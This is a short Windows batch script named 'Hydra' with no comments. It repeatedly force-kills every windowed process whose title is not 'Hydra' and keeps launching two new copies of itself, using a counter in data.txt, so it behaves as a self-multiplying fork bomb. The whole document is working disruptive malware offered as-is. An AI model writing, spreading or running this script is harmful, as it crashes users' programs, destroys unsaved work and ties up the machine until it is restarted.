@ECHO OFF
TITLE Hydra 
SET n=0
:begin
SET /a n+=1
IF NOT EXIST data.txt type nul > data.txt
FINDSTR /m "%n%" data.txt
if %errorlevel%==0 (
goto :begin
)
:loop 
FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
SET windowcount=%%F
)
taskkill /F /FI "WINDOWTITLE ne Hydra"
IF "%windowcount%"=="%n%" (
START Hydra.bat
START Hydra.bat
SET /a n+=1
ECHO %n% > data.txt
)
GOTO :loop
